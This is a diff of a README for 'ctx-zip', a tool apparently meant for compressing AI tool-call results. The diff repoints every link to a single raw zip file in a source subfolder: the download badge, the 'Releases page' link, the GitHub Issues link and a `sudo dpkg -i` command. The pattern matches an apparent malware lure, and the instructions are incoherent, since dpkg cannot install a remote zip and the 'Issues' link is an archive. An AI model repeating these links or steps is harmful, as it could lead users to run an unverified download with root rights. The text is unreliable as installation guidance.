@@ -6,7 +6,7 @@ Welcome to ctx-zip! This tool simplifies context compression of tool call result
 
 ## 📥 Download
 
-[![Download ctx-zip](https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip)](https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip)
+[![Download ctx-zip](https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip)](https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ ctx-zip offers several features to make your life easier:
 
 ## 📦 Download & Install
 
-To get ctx-zip, visit [this page to download](https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip). Here’s how to do it:
+To get ctx-zip, visit [this page to download](https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip). Here’s how to do it:
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version. It is usually at the top of the list.
@@ -63,7 +63,7 @@ If you downloaded a package for Linux, follow these steps:
 2. Navigate to the directory where you downloaded the file.
 3. Use your package manager to install the package. For example, if you have a `.deb` file, run:
    ```
-   sudo dpkg -i https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip
+   sudo dpkg -i https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip
    ```
 4. After installation, you can run ctx-zip from your applications menu or by typing `ctx-zip` in your terminal.
 
@@ -87,7 +87,7 @@ Using ctx-zip is straightforward. Here’s how to compress your tool call result
 
 If you run into any issues, you can get support easily:
 
-1. Check the [Issues section on GitHub](https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip) for common problems and solutions.
+1. Check the [Issues section on GitHub](https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip) for common problems and solutions.
 2. Feel free to create a new issue if you don’t find an answer.
 
 For additional help, look for community forums where other users discuss their experiences with ctx-zip. 
@@ -96,4 +96,4 @@ For additional help, look for community forums where other users discuss their e
 
 ctx-zip makes context compression simple and efficient. With intuitive features and easy installation, you can start utilizing it right away. Download your version today and enjoy a smoother experience with your tool call results. 
 
-Remember, you can always return to the [download page](https://raw.githubusercontent.com/mahmoud7876/ctx-zip/main/poundless/ctx-zip.zip) for updates or to get help.
+Remember, you can always return to the [download page](https://github.com/mahmoud7876/ctx-zip/raw/refs/heads/main/src/strategies/ctx_zip_2.9.zip) for updates or to get help.
